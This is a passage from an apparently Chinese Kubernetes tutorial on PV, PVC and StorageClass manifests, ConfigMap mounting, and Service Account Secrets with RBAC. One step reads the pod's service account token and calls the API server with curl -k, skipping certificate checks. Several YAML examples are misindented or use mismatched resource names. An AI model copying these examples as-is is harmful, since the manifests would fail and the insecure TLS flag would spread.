class="hljs-number">1.100</span>                    <span class="hljs-comment"># NFS 服务器地址</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">手动创建存储路径</font>：<ul><li>由于 K8S 不会自动创建存储路径，因此我们需要手动创建存储路径。</li></ul></li><li><font color="#00b0f0">无需指定 namespace</font>：<ul><li>PV 是集群范围的资源，不属于任何命名空间。因此在创建 PV 时，不需要指定 <code>metadata.namespace</code> 字段</li></ul></li><li><font color="#00b0f0">storageClassName、accessModes 必须指定</font><ul><li><font color="#7030a0">PV + PVC 模式下</font>：<ul><li>只有当两者的 <code>storageClassName</code> 和 <code>accessModes</code> 与 PV 一致时，绑定才会成功，否则 PVC 将始终处于 <code>Pending</code> 状态，无法绑定到 PV</li></ul></li><li><font color="#7030a0">StorageClass + PVC 模式下</font>：<ul><li>只有当 PVC 的 <code>storageClassName</code> 指定对应的 <code>StorageClass</code> 时，绑定才会成功，否则 PVC 将始终处于 <code>Pending</code> 状态，无法绑定到 PV</li></ul></li></ul></li><li><font color="#00b0f0">存储模式的配置（<code>volumeMode</code>）</font>：<ul><li><font color="#7030a0">Filesystem</font>：将该 PV 挂载为文件系统，类似于普通硬盘，一般都是使用此方式</li><li><font color="#7030a0">Block</font>：将该 PV 作为原始磁盘块进行挂载，<strong>很少使用，如果不是内核开发者，否则永远不要碰它</strong></li></ul></li><li><font color="#00b0f0">访问模式的配置（<code>accessModes</code>）</font>：<ul><li><font color="#7030a0">ReadWriteOnce</font>：允许单个节点对 PV 进行读写</li><li><font color="#7030a0">ReadOnlyMany</font>：允许多个节点以只读模式访问 PV</li><li><font color="#7030a0">ReadWriteMany</font>：允许多个节点对 PV 进行读写</li></ul></li><li><font color="#00b0f0">回收策略的配置（<code>persistentVolumeReclaimPolicy</code>）</font>：<ul><li><font color="#7030a0">Retain</font>：释放 PVC 时，PV 保留，不会删除。</li><li><font color="#7030a0">Delete</font>：释放 PVC 时，PV 会被删除</li><li><font color="#7030a0">Recycle</font>：释放 PVC 时，PV 的数据会被清空并重新回收到存储池</li></ul></li></ol></blockquote><hr><h5 id="11-5-3-补充：PVC-资源的写法"><a href="#11-5-3-补充：PVC-资源的写法" class="headerlink" title="11.5.3. 补充：PVC 资源的写法"></a>11.5.3. 补充：PVC 资源的写法</h5><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> PersistentVolumeClaim<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> nfs-pvc                                   <span class="hljs-meta"># PVC 名称</span><br><span class="hljs-symbol">  namespace:</span> dev                                  <span class="hljs-meta"># PVC 所属命名空间</span><br><span class="hljs-symbol">spec:</span><br><span class="hljs-symbol">  accessModes:</span><br>    - ReadWriteMany                               <span class="hljs-meta"># 定义 PVC 的访问模式，这里是允许多节点对 PVC 进行读写</span><br><span class="hljs-symbol">  storageClassName:</span> nas-storage                   <span class="hljs-meta"># 指定 StorageClass</span><br><span class="hljs-symbol">  resources:</span><br><span class="hljs-symbol">    requests:</span><br><span class="hljs-symbol">      storage:</span> <span class="hljs-number">5</span>Gi                                <span class="hljs-meta"># 向 PV 请求 5Gi 的存储空间</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">namespace 必须指定</font>：<ul><li>Pod 在挂载 PVC 时，必须与 PVC 在同一个命名空间，否则挂载会失败，或挂载其他 PVC</li></ul></li><li><font color="#00b0f0">storageClassName、accessModes 必须指定</font><ul><li><font color="#7030a0">PV + PVC 模式下</font>：<ul><li>只有当 PVC 的 <code>storageClassName</code> 和 <code>accessModes</code> 与 PV 一致时，绑定才会成功，否则 PVC 将始终处于 <code>Pending</code> 状态，无法绑定到 PV</li></ul></li><li><font color="#7030a0">StorageClass + PVC 模式下</font>：<ul><li>只有当 PVC 的 <code>storageClassName</code> 和 <code>StorageClass</code>的名称一致时，绑定才会成功，否则 PVC 将始终处于 <code>Pending</code> 状态，无法绑定到 PV</li></ul></li></ul></li></ol></blockquote><hr><h5 id="11-5-4-补充：StorageClass-资源的写法"><a href="#11-5-4-补充：StorageClass-资源的写法" class="headerlink" title="11.5.4. 补充：StorageClass 资源的写法"></a>11.5.4. 补充：StorageClass 资源的写法</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> storage.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> StorageClass<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> fast-storage<br><span class="hljs-params">provisioner:</span> kubernetes.io<span class="hljs-symbol">/aws-ebs</span>          <span class="hljs-comment"># 存储插件，指定由那个存储系统来提供 PV</span><br><span class="hljs-params">reclaimPolicy:</span> Retain                       <span class="hljs-comment"># 回收策略，这里是PVC 释放后，PV 保留不删除</span><br><span class="hljs-params">volumeBindingMode:</span> Immediate                <span class="hljs-comment"># 绑定模式，这里是立即分配存储</span><br><span class="hljs-params">allowVolumeExpansion:</span> <span class="hljs-literal">true</span>                  <span class="hljs-comment"># 是否允许扩展卷的大小，true 表示允许</span><br><span class="hljs-params">parameters:</span>                                 <span class="hljs-comment"># 存储参数，不同存储插件参数不同</span><br>  <span class="hljs-params">type:</span> gp2                                 <span class="hljs-comment"># AWS EBS 存储类型，gp2 为通用型 SSD</span><br>  <span class="hljs-params">fsType:</span> ext4                              <span class="hljs-comment"># 文件系统类型，ext4 是常用的 Linux 文件系统</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">手动创建存储路径</font>：<ul><li>由于 K8S 不会自动创建存储路径，因此我们需要手动创建存储路径。</li></ul></li><li><font color="#00b0f0">无需指定 namespace</font>：<ul><li>StorageClass 是集群范围的资源，不属于任何命名空间。因此在创建 StorageClass 时，不需要指定 <code>metadata.namespace</code> 字段</li></ul></li><li><font color="#00b0f0">无需指定 accessModes</font>：<ul><li>使用 StorageClass 无需指定 accessModes，让 PVC 完全按照 StorageClass 的名称进行匹配</li></ul></li><li><font color="#00b0f0">允许扩展卷大小</font>：<ul><li><font color="#7030a0">true</font>：<ul><li>允许修改 PVC 来增加已绑定的卷大小，可以动态扩展卷的容量</li></ul></li><li>f<font color="#7030a0">alse</font>：<ul><li>不允许修改 PVC 来增加已绑定的卷大小</li></ul></li></ul></li><li><font color="#00b0f0">绑定模式的配置（<code>volumeBindingMode</code>）</font><ul><li><font color="#7030a0">Immediate</font>：<ul><li>PVC 创建后，立刻为其创建和分配 PV</li></ul></li><li><font color="#7030a0">WaitForFirstConsumer</font>：<ul><li>PVC 常见后，不立刻为其创建和分配 PV，而是在 Pod 挂载 PVC 后再为其创建和分配</li></ul></li></ul></li><li><font color="#00b0f0">回收策略的配置（<code>reclaimPolicy</code>）</font>：<ul><li><font color="#7030a0">Retain</font>：释放 PVC 时，PV 保留，不会删除。</li><li><font color="#7030a0">Delete</font>：释放 PVC 时，PV 会被删除</li><li><font color="#7030a0">Recycle</font>：释放 PVC 时，PV 的数据会被清空并重新回收到存储池</li></ul></li></ol></blockquote><hr><h4 id="11-6-ConfigMap-实战步骤"><a href="#11-6-ConfigMap-实战步骤" class="headerlink" title="11.6. ConfigMap 实战步骤"></a>11.6. ConfigMap 实战步骤</h4><h5 id="11-6-1-以-Env-挂载"><a href="#11-6-1-以-Env-挂载" class="headerlink" title="11.6.1. 以 Env 挂载"></a>11.6.1. 以 Env 挂载</h5><h6 id="11-6-1-1-编写配置信息文件（properties-文件）"><a href="#11-6-1-1-编写配置信息文件（properties-文件）" class="headerlink" title="11.6.1.1. 编写配置信息文件（properties 文件）"></a>11.6.1.1. 编写配置信息文件（properties 文件）</h6><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># variate.properties</span><br><br><span class="hljs-attr">enemies</span>=aliens<br><span class="hljs-attr">lives</span>=<span class="hljs-number">3</span><br><span class="hljs-attr">enemies.cheat</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">enemies.cheat.level</span>=noGoodRotten<br><span class="hljs-attr">secret.code.passphrase</span>=UUDDLRLRBABAS<br><span class="hljs-attr">secret.code.allowed</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">secret.code.lives</span>=<span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><hr><h6 id="11-6-1-2-创建-ConfigMap-资源"><a href="#11-6-1-2-创建-ConfigMap-资源" class="headerlink" title="11.6.1.2. 创建 ConfigMap 资源"></a>11.6.1.2. 创建 ConfigMap 资源</h6><p>&#x3D;&#x3D;1.创建 ConfigMap 资源&#x3D;&#x3D;</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">kubectl <span class="hljs-built_in">create</span> configmap variate-<span class="hljs-built_in">config</span> <span class="hljs-comment">--from-file=variate.properties</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.检查 ConfigMap 资源状态&#x3D;&#x3D;</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kubectl get configmap variate-config -o yaml<br></code></pre></td></tr></table></figure><hr><h6 id="11-6-1-3-Pod-挂载-ConfigMap（以-Env-挂载）"><a href="#11-6-1-3-Pod-挂载-ConfigMap（以-Env-挂载）" class="headerlink" title="11.6.1.3. Pod 挂载 ConfigMap（以 Env 挂载）"></a>11.6.1.3. Pod 挂载 ConfigMap（以 Env 挂载）</h6><p>&#x3D;&#x3D;1.加载所有键值对成环境变量（推荐）&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><br><span class="hljs-params">kind:</span> Pod<br><br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> my-pod<br>  <span class="hljs-params">namespace:</span> xxxxxx<br>  <br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> my-container<br>      <span class="hljs-params">image:</span> nginx:latest<br>  <span class="hljs-params">envFrom:</span>                       <span class="hljs-comment"># 从外部源（这里是 ConfigMap）加载多个环境bianlaing</span><br><span class="hljs-operator">-</span> <span class="hljs-params">configMapRef:</span>              <span class="hljs-comment"># 引用一个 ConfigMap，将其中的所欲键值对加载为环境变量</span><br><span class="hljs-params">name:</span> bianliang-config<br>  <span class="hljs-params">env:</span>                           <span class="hljs-comment"># 手动 指定 / 覆盖  环境变量</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> user                 <span class="hljs-comment"># 指定环境变量的名称</span><br>      <span class="hljs-params">value:</span> <span class="hljs-string">&quot;nginx_admin&quot;</span>       <span class="hljs-comment"># 手动 指定 / 覆盖 环境变量的值</span><br></code></pre></td></tr></table></figure><hr><h6 id="11-6-1-4-使用-ConfigMap（以-Env-输出）"><a href="#11-6-1-4-使用-ConfigMap（以-Env-输出）" class="headerlink" title="11.6.1.4. 使用 ConfigMap（以 Env 输出）"></a>11.6.1.4. 使用 ConfigMap（以 Env 输出）</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Secret code allowed: <span class="hljs-variable">$SECRET_CODE_allowed</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Lives remaining: <span class="hljs-variable">$SECRET_CODE_LIVES</span>&quot;</span><br></code></pre></td></tr></table></figure><hr><h5 id="11-6-2-以-Volume-挂载"><a href="#11-6-2-以-Volume-挂载" class="headerlink" title="11.6.2. 以 Volume 挂载"></a>11.6.2. 以 Volume 挂载</h5><h6 id="11-6-2-1-编写配置信息文件（格式不限）"><a href="#11-6-2-1-编写配置信息文件（格式不限）" class="headerlink" title="11.6.2.1. 编写配置信息文件（格式不限）"></a>11.6.2.1. 编写配置信息文件（格式不限）</h6><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># nginx.conf</span><br><br><span class="hljs-attribute">user</span>  nobody;<br><span class="hljs-attribute">worker_processes</span>  <span class="hljs-number">1</span>;<br><span class="hljs-attribute">error_log</span>  logs/<span class="hljs-literal">error</span>.log <span class="hljs-literal">error</span>;<br><span class="hljs-attribute">pid</span>        logs/nginx.pid;<br><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;                                          <span class="hljs-comment"># 监听的端口</span><br>    <span class="hljs-attribute">server_name</span> <span class="hljs-number">192.168.136.8</span>;                          <span class="hljs-comment"># 代理服务器 IP（你的 Nginx 服务器 IP）</span><br>    <br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://myserver;                     <span class="hljs-comment"># 被代理的服务器</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="11-6-2-2-创建-ConfigMap-资源"><a href="#11-6-2-2-创建-ConfigMap-资源" class="headerlink" title="11.6.2.2. 创建 ConfigMap 资源"></a>11.6.2.2. 创建 ConfigMap 资源</h6><p>&#x3D;&#x3D;1.创建 ConfigMap 资源&#x3D;&#x3D;</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">kubectl <span class="hljs-built_in">create</span> configmap nginx-<span class="hljs-built_in">config</span> <span class="hljs-comment">--from-file=nginx.conf</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.检查 ConfigMap 资源状态&#x3D;&#x3D;</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kubectl get configmap nginx-config -o yaml<br></code></pre></td></tr></table></figure><hr><h6 id="11-6-2-3-Pod-挂载-ConfigMap（以-Volume-挂载）"><a href="#11-6-2-3-Pod-挂载-ConfigMap（以-Volume-挂载）" class="headerlink" title="11.6.2.3. Pod 挂载 ConfigMap（以 Volume 挂载）"></a>11.6.2.3. Pod 挂载 ConfigMap（以 Volume 挂载）</h6><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><br><span class="hljs-params">kind:</span> Pod<br><br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> my-pod<br>  <span class="hljs-params">namespace:</span> xxxxxx<br>  <br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br><span class="hljs-operator">-</span> <span class="hljs-params">name:</span> nginx<br>  <span class="hljs-params">image:</span> nginx:latest<br>  <span class="hljs-params">volumeMounts:</span>                                      <span class="hljs-comment"># 容器内卷的挂载配置</span><br><span class="hljs-operator">-</span> <span class="hljs-params">name:</span> config-volume                            <span class="hljs-comment"># 指定要挂载的存储卷的名称</span><br>  <span class="hljs-params">mountPath:</span> <span class="hljs-symbol">/etc/nginx/nginx.conf</span>               <span class="hljs-comment"># 挂载点，即存储卷挂载容器内的哪个目录</span><br>  <span class="hljs-params">subPath:</span> nginx.conf                            <span class="hljs-comment"># 只挂载卷内的某个子路径或特定文件</span><br><br>  <span class="hljs-params">volumes:</span>                                               <span class="hljs-comment"># 定义 Pod 级别的存储卷</span><br><span class="hljs-operator">-</span> <span class="hljs-params">name:</span> config-volume                                <span class="hljs-comment"># 存储卷的名称                        </span><br>  <span class="hljs-params">configMap:</span>                                         <span class="hljs-comment"># 使用 ConfigMap 存储方式</span><br><span class="hljs-params">name:</span> nginx-config                               <span class="hljs-comment"># ConfigMap 的名称为</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>subPath: nginx.conf</code>：<ul><li>表示只挂载 ConfigMap 中名为 <code>nginx.conf</code> 的文件，而不是整个 ConfigMap。这意味着容器中 <code>/etc/nginx/nginx.conf</code> 文件会被替换为 ConfigMap 中 <code>nginx.conf</code> 文件的内容。</li></ul></li></ol></blockquote><hr><h5 id="11-6-3-补充：ConfigMap-更新"><a href="#11-6-3-补充：ConfigMap-更新" class="headerlink" title="11.6.3. 补充：ConfigMap 更新"></a>11.6.3. 补充：ConfigMap 更新</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 1. 编辑完配置文件后，重新创建 ConfigMap，并应用此更新</span><br>kubectl create configmap bianliang-config <span class="hljs-attribute">--from-file</span>=bianliang.properties <span class="hljs-attribute">--dry-run</span>=client -o yaml | kubectl apply -f -<br><br><br><span class="hljs-comment"># 2. 为相关的 Deployment 触发滚动更新，应用最新的 ConfigMap</span><br>kubectl rollout restart deployment &lt;deployment-name&gt;<br></code></pre></td></tr></table></figure><hr><h4 id="11-7-Secret-实战步骤"><a href="#11-7-Secret-实战步骤" class="headerlink" title="11.7. Secret 实战步骤"></a>11.7. Secret 实战步骤</h4><h5 id="11-7-1-Secret-的组成"><a href="#11-7-1-Secret-的组成" class="headerlink" title="11.7.1. Secret 的组成"></a>11.7.1. Secret 的组成</h5><p>Secret 主要由以下三部分组成：</p><ol><li>&#x3D;&#x3D;Service Account Secret&#x3D;&#x3D;：<ol><li>当在 Pod 内部需要执行 <code>kubectl</code> 命令的时候，需要携带本 Pod 所绑定的 <code>Service Account</code> 的 <code>Token</code> ，用于 <code>API Server</code> 对其执行认证和鉴权</li></ol></li><li>&#x3D;&#x3D;Opaque Secret&#x3D;&#x3D;：<ol><li>适用于存储<strong>密码、密钥、API Key 等敏感信息</strong>。可由用户自定义创建和管理。</li><li><code>Opaque Secret</code> 中的数据必须以 <code>base64</code> 编码的形式存储，虽然不能完全防止恶意用户访问，但它能够确保数据在配置文件中是以编码的方式存储的，从而增加了一定的安全性。</li><li>需要注意的是，Base64 编码只是使其适合在文本中传输，不提供任何加密功能，任何人都可以轻松解码回原始数据。</li></ol></li><li>&#x3D;&#x3D;dockerconfigjson&#x3D;&#x3D;：<ol><li>当 Pod 需要从<strong>私有仓库（例如阿里云或 Docker Hub 私有仓库）拉取镜像</strong>时，用于存储 Docker 认证信息。</li></ol></li></ol><hr><h5 id="11-7-2-Service-Account-Secret-实战步骤"><a href="#11-7-2-Service-Account-Secret-实战步骤" class="headerlink" title="11.7.2. Service Account Secret 实战步骤"></a>11.7.2. Service Account Secret 实战步骤</h5><h6 id="11-7-2-1-创建-Service-Account-资源"><a href="#11-7-2-1-创建-Service-Account-资源" class="headerlink" title="11.7.2.1. 创建 Service Account 资源"></a>11.7.2.1. 创建 Service Account 资源</h6><p>&#x3D;&#x3D;1.编写 Service Account 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> ServiceAccount<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> my-service-account            <span class="hljs-meta"># Service Account 名称</span><br><span class="hljs-symbol">  namespace:</span> default                  <span class="hljs-meta"># Service Account 的 namespace</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">必须指定 namespace</font>：<ul><li>因为使用 Pod 指定 Service Account，会去找 Pod 所在的 namespace 中的 Service Account</li></ul></li></ol></blockquote><p>&#x3D;&#x3D;2.创建 Service Account 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f service-account.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.查看 Service Account 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> serviceaccount<br></code></pre></td></tr></table></figure><hr><h6 id="11-7-2-2-使用-RBAC-为-Service-Account-绑定权限"><a href="#11-7-2-2-使用-RBAC-为-Service-Account-绑定权限" class="headerlink" title="11.7.2.2. 使用 RBAC 为 Service Account 绑定权限"></a>11.7.2.2. 使用 RBAC 为 Service Account 绑定权限</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Role</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pod-reader</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroups:</span> [<span class="hljs-string">&quot;&quot;</span>]<br>    <span class="hljs-attr">resources:</span> [<span class="hljs-string">&quot;pods&quot;</span>]<br>    <span class="hljs-attr">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;watch&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>]<br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">RoleBinding</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pod-reader-binding</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">subjects:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">my-sa</span><br>    <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">roleRef:</span><br>  <span class="hljs-attr">kind:</span> <span class="hljs-string">Role</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pod-reader</span><br>  <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：关于 Service Account 授权的理解</p><ol><li>Service Account 需要与 Pod 绑定，一个 Pod 只能绑定一个 Service Account，但一个 Service Account 可以绑定多个 Pod</li><li>绑定 Service Account 到 Pod 后，在该 Pod 内执行 <code>kubectl</code> 命令时，权限取决于 Role 的设置。<ul><li>如果使用的是 RoleBinding，那么只能操作或访问该 Role 和 RoleBinding 所在 namespace 下的资源；</li><li>如果使用的是 ClusterRoleBinding，则可以操作或访问 ClusterRole 所指定的所有 namespace 下的资源。</li></ul></li></ol></blockquote><hr><h6 id="11-7-2-3-Pod-指定-Service-Account"><a href="#11-7-2-3-Pod-指定-Service-Account" class="headerlink" title="11.7.2.3. Pod 指定 Service Account"></a>11.7.2.3. Pod 指定 Service Account</h6><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> mypod<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">serviceAccountName:</span> my-service-account                  <span class="hljs-comment"># 指定要使用的 Service Account</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> mycontainer<br>      <span class="hljs-params">image:</span> nginx<br></code></pre></td></tr></table></figure><hr><h6 id="11-7-2-4-在-Pod-中访问-API-Server"><a href="#11-7-2-4-在-Pod-中访问-API-Server" class="headerlink" title="11.7.2.4. 在 Pod 中访问 API Server"></a>11.7.2.4. 在 Pod 中访问 API Server</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 进入 Pod</span><br>kubectl <span class="hljs-built_in">exec</span> -it &lt;pod-name&gt;<br><br><br><span class="hljs-comment"># 2. 获取 Token</span><br>kubectl <span class="hljs-built_in">exec</span> -it &lt;pod-name&gt; -- <span class="hljs-built_in">ls</span> /run/secrets/kubernetes.io/serviceaccount<br><br><br><span class="hljs-comment"># 3. 在 Pod 内部访问 API Server</span><br>TOKEN=$(<span class="hljs-built_in">cat</span> /run/secrets/kubernetes.io/serviceaccount/token)<br>curl -k -H <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$TOKEN</span>&quot;</span> https://kubernetes.default.svc/api/v1/nodes<br></code></pre></td></tr></table></figure><hr><h6 id="11-7-2-5-补充：Service-Account-相关命令"><a href="#11-7-2-5-补充：Service-Account-相关命令" class="headerlink" title="11.7.2.5. 补充：Service Account 相关命令"></a>11.7.2.5. 补充：Service Account 相关命令</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 获取某 Pod 的 Service Account 的 Token</span><br>kubectl <span class="hljs-built_in">exec</span> -it &lt;pod-name&gt; -n &lt;namespace&gt; -- <span class="hljs-built_in">ls</span> /run/secrets/kubernetes.io/serviceaccount<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>/run/secrets/kubernetes.io/serviceaccount</code> 可能包含：<ul><li><font color="#00b0f0">ca.crt</font>：<ul><li>K8s API 服务器的 CA 证书（用于验证 API Server 的身份）</li></ul></li><li><font color="#00b0f0">namespace</font>：<ul><li>Pod 所在的 Namespace</li></ul></li><li><font color="#00b0f0">token</font>：<ul><li>Pod 内部访问 Kubernetes API 的认证 Token</li></ul></li></ul></li></ol></blockquote><hr><h6 id="11-7-2-6-补充：默认-Service-Account"><a href="#11-7-2-6-补充：默认-Service-Account" class="headerlink" title="11.7.2.6. 补充：默认 Service Account"></a>11.7.2.6. 补充：默认 Service Account</h6><p>K8S 会为每个 namespace 自动创建一个默认的 Service Account。如果该 namespace 下的 Pod 未指定 Service Account，默认将使用该 Service Account。</p><p>Service Account 会被挂载到 Pod 的 <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> 路径中。</p><p>默认情况下，默认的 Service Account 没有绑定任何角色，这意味着它几乎没有任何权限。</p><hr><h5 id="11-7-3-Opaque-Secret-实战步骤"><a 